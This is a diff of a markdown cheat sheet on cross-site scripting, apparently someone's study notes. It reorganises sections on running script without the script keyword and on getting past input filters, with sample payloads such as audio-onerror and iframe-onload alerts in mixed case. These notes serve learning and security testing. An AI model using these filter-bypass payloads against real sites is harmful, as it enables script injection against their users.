@@ -187,8 +187,9 @@ Tempte:              | Example:
 [LiveOverflow]: https://www.youtube.com/watch?v=HcrQy0C-hEA
        
 ## [Execution] (6) - Without the `script` Keyword
-+ `<audio src/onerror=alert(1)>`
 
++ In the section: _2. Bypass Filter/Sanitization_ 
+ - Look at this subsection: _[Bypassing] (2) - Bypass Filters_
 
 ------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------
@@ -234,9 +235,14 @@ Tempte:              | Example:
 
 ## [Bypassing] (2) - Bypass Filters 
 
+**Without `<script>` keyword**
++ Can use `tags` lik _audio, iframe, svg, etc._
++ `<audio src/onerror=alert(1)>`
++ `<iframe/oNloAd=alert(1)//>`
+
+**Space**
 + Can use `/` after tag name instead of a space
   `<iframe/oNloAd=alert()//>`
-
 + Use _URL Encoding_
  - The Browser will _AUTOMATICALLY DECODE URL encoded values_
  - Encoded URL parameters get decoded when variables from URL 
